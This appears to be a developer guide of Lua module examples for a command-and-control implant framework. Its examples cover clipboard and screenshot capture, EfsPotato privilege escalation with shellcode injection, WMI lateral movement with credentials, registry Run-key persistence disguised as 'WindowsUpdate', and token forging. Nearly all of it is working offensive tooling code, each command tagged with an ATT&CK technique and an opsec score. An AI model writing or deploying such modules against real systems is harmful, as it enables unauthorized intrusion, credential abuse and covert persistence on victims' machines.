# MAL Development Practical Examples

Real code patterns from the community at `helper/intl/community/modules/`.

## Example 1: Minimal BOF Command (clipboard)

A no-argument BOF in its simplest form:

```lua
local function bof_path(name, arch)
    return "bof/" .. name .. "/" .. name .. "." .. arch .. ".o"
end

local function run_clipboard()
    local session = active()
    local arch = session.Os.Arch
    return bof(session, script_resource(bof_path("clipboard", arch)), {}, true)
end

command("clipboard", run_clipboard, "Read clipboard content", "T1115")
opsec("clipboard", 9.0)
```

Key points: use `{}` for empty arguments; BOF path convention is `bof/<name>/<name>.<arch>.o`.

## Example 2: BOF with Flags (screenshot)

```lua
local function run_screenshot(cmd)
    local filename = cmd:Flags():GetString("filename")
    local session = active()
    local arch = session.Os.Arch
    local packed = bof_pack("z", filename)
    return bof(session, script_resource(bof_path("screenshot", arch)), packed, true)
end

local cmd = command("screenshot", run_screenshot, "Take screenshot", "T1113")
cmd:Flags():String("filename", "screenshot.jpg", "output filename")
opsec("screenshot", 9.0)
```

Key points: `bof_pack("z", ...)` packs an ANSI string argument.

## Example 3: HTTP Client (complex flags + input validation)

```lua
local function run_curl(args, cmd)
    local host = cmd:Flags():GetString("host")
    local port = cmd:Flags():GetInt("port")
    local method = cmd:Flags():GetString("method")
    local body = cmd:Flags():GetString("body")
    local noproxy = cmd:Flags():GetBool("noproxy")

    if host == "" then error("--host is required") end

    -- Enum validation
    local valid = {GET=true, POST=true, PUT=true, DELETE=true}
    if not valid[method] then
        error("Invalid HTTP method: " .. method)
    end

    -- Boolean to integer conversion (required by BOF)
    local proxy = noproxy and 0 or 1

    local packed = bof_pack("zizizzzi",
        host, port, method, 1, "", "", body, proxy)
    return bof(session, script_resource(bof_path("curl", arch)), packed, true)
end

local cmd = command("curl", run_curl, "HTTP client", "T1071.001")
cmd:Flags():String("host", "", "Target host")
cmd:Flags():Int("port", 80, "Port")
cmd:Flags():String("method", "GET", "HTTP method")
cmd:Flags():String("body", "", "Request body")
cmd:Flags():Bool("noproxy", false, "Disable proxy")
opsec("curl", 8.0)
```

Key points: use a table for enum validation; use `and/or` for boolean-to-integer conversion.

## Example 4: Privilege Escalation — Multi-Mode Execution (EfsPotato)

Demonstrates CLR version detection, multiple execution modes, and shellcode loading:

```lua
local function run_efspotato(cmd)
    local session = active()
    local arch = session.Os.Arch
    local exec_command = cmd:Flags():GetString("command")

    -- Select binary based on CLR version
    local efs_exe
    if has_clr_version(session, "v4.0") then
        efs_exe = "elevate/EfsPotato/EfsPotato4.0.exe"
    else
        efs_exe = "elevate/EfsPotato/EfsPotato3.5.exe"
    end

    if exec_command ~= "" then
        -- Command execution mode
        return execute_assembly(session, script_resource(efs_exe),
            {exec_command}, true, new_sac())
    else
        -- Shellcode injection mode (use self_stager as payload)
        local shellcode = self_stager(session, arch)
        local sc_b64 = base64_encode(shellcode)
        return execute_assembly(session, script_resource(efs_exe),
            {"-s", sc_b64}, true, new_sac())
    end
end

local cmd = command("elevate:EfsPotato", run_efspotato, "EfsPotato privilege escalation", "T1134")
cmd:Flags():String("command", "", "Command to execute (empty = inject shellcode)")
opsec("elevate:EfsPotato", 8.0)
```

Key points: `has_clr_version()` detects .NET version; `self_stager()` retrieves self-shellcode; two execution modes.

## Example 5: Lateral Movement — Credential Handling (WMI)

Demonstrates credential validation, dual argument parsing, and architecture constraints:

```lua
local function run_wmi(args, cmd)
    local target = cmd:Flags():GetString("target")
    local exec_command = cmd:Flags():GetString("command")
    local username = cmd:Flags():GetString("username")
    local password = cmd:Flags():GetString("password")
    local domain = cmd:Flags():GetString("domain")

    if target == "" then error("--target is required") end
    if exec_command == "" then error("--command is required") end

    local session = active()
    local arch = session.Os.Arch
    if arch ~= "x64" then error("WMI BOF requires x64") end

    -- Current user vs explicit credentials
    local is_current = 1
    if username ~= "" then is_current = 0 end

    local wmi_path = "\\\\" .. target .. "\\ROOT\\CIMV2"
    local packed = bof_pack("zzzzzi",
        wmi_path, exec_command, username, password, domain, is_current)

    return bof(session, script_resource(bof_path("wmi", arch)), packed, true)
end

local cmd = command("move:wmi-proccreate", run_wmi, "WMI remote process create", "T1047")
cmd:Flags():String("target", "", "Target IP")
cmd:Flags():String("command", "", "Command to execute")
cmd:Flags():String("username", "", "Username (empty = current)")
cmd:Flags():String("password", "", "Password")
cmd:Flags():String("domain", "", "Domain")
opsec("move:wmi-proccreate", 7.0)
```

Key points: credentials are optional (empty = current user); UNC path construction; architecture constraint check.

## Example 6: Persistence — Payload Source Abstraction

Demonstrates three payload sources, file upload, and registry operations:

```lua
local function run_reg_persist(cmd)
    local session = active()
    local artifact_name = cmd:Flags():GetString("artifact_name")
    local custom_file = cmd:Flags():GetString("custom_file")
    local use_self = cmd:Flags():GetBool("use_malefic_as_custom_file")
    local drop_location = cmd:Flags():GetString("drop_location")
    local reg_key = cmd:Flags():GetString("registry_key")
    local key_name = cmd:Flags():GetString("key_name")

    -- Mutual exclusion validation
    if use_self and custom_file ~= "" then
        error("Cannot use both --use_malefic_as_custom_file and --custom_file")
    end

    -- Three payload sources
    local payload
    if artifact_name ~= "" then
        payload = download_artifact(artifact_name)
    elseif use_self then
        payload = self_artifact(session)
    elseif custom_file ~= "" then
        payload = read(custom_file)
    end

    -- Upload payload to target
    if drop_location ~= "" and payload then
        uploadraw(session, payload, drop_location, "0644", false)
    end

    -- Add registry Run key
    local hive = reg_key:split("\\")[1]
    local path = reg_key:split("\\")[2]
    reg_add(session, hive, path, key_name, "REG_SZ", drop_location)
end

local cmd = command("persistence:Registry_Key", run_reg_persist, "Registry Run key persistence", "T1547.001")
cmd:Flags():String("artifact_name", "", "Artifact from server")
cmd:Flags():String("custom_file", "", "Local file to upload")
cmd:Flags():Bool("use_malefic_as_custom_file", false, "Use current implant binary")
cmd:Flags():String("drop_location", "C:\\Windows\\Temp\\svc.exe", "Remote drop path")
cmd:Flags():String("registry_key", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Registry key")
cmd:Flags():String("key_name", "WindowsUpdate", "Key name")
opsec("persistence:Registry_Key", 8.0)
```

Key points: `download_artifact()` fetches build artifacts from the server; `self_artifact()` retrieves the current implant; `uploadraw()` uploads files; `reg_add()` modifies the registry.

## Example 7: Token Operations — Enum Validation

```lua
local function run_make_token(cmd)
    local username = cmd:Flags():GetString("username")
    local password = cmd:Flags():GetString("password")
    local domain = cmd:Flags():GetString("domain")
    local logon_type = cmd:Flags():GetString("type")

    if username == "" then error("--username is required") end
    if password == "" then error("--password is required") end

    -- Enum validation
    local valid_types = {
        ["2"] = true,   -- Interactive
        ["3"] = true,   -- Network
        ["8"] = true,   -- NetworkCleartext
        ["9"] = true,   -- NewCredentials
    }
    if not valid_types[logon_type] then
        error("Invalid logon type. Valid: 2 (Interactive), 3 (Network), 8 (NetworkCleartext), 9 (NewCredentials)")
    end

    local session = active()
    local packed = bof_pack("ZZZi", username, password, domain, tonumber(logon_type))
    return bof(session, script_resource(bof_path("make_token", session.Os.Arch)), packed, true)
end

local cmd = command("token:make", run_make_token, "Create token with credentials", "T1134.001")
cmd:Flags():String("username", "", "Username")
cmd:Flags():String("password", "", "Password")
cmd:Flags():String("domain", "", "Domain")
cmd:Flags():String("type", "9", "Logon type (default: NewCredentials)")
opsec("token:make", 9.0)
```

Key points: `Z` format packs wide strings; `tonumber()` converts types; a table is used for enum validation with valid values listed in the error message.

## Example 8: Module Loading (Precompiled DLL)

```lua
local function run_load_module(arg_1, cmd)
    local session = active()
    local arch = barch(session)
    if not arch or arch == "" then arch = "x64" end

    load_module(session, arg_1, script_resource("modules/" .. arg_1 .. "." .. arch .. ".dll"))
end

local cmd = command("load_module", run_load_module, "Load precompiled module into implant", "")
bind_args_completer(cmd, values_completer({"full", "fs", "execute", "sys", "rem"}))
```

Key points: `load_module()` loads a DLL (different from BOF); `barch()` safely retrieves architecture; `bind_args_completer()` adds tab completion.

## Example 9: Event Callbacks (Session Monitoring + Timers)

```lua
-- Notify when a new session comes online
function on_beacon_initial(event)
    local session = event.Session
    if session then
        broadcast(string.format("[!] New: %s@%s (%s)",
            session.Os.Username or "?",
            session.Os.Hostname or "?",
            session.SessionId))
    end
end

-- Heartbeat check every 5 minutes
function on_heartbeat_5m()
    print("[*] Heartbeat: " .. timestamp_format())
end
```

## Common Helper Patterns

### BOF Path Helper

```lua
local function bof_path(name, arch)
    return "bof/" .. name .. "/" .. name .. "." .. arch .. ".o"
end
```

### CLR Version Detection

```lua
-- Check if the session has a specific CLR version
function has_clr_version(session, pattern)
    local versions = session.Os.ClrVersion
    if versions == nil then return false end
    local i = 1
    while true do
        local v = versions[i]
        if v == nil then break end
        if string.find(v, pattern, 1, true) then return true end
        i = i + 1
    end
    return false
end
```

### Default Values Table Pattern

```lua
local defaults = {
    droplocation = "C:\\Windows\\Temp\\svc.exe",
    regkey = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    keyname = "WindowsUpdate",
}

-- Usage: value ~= "" and value or defaults.droplocation
```
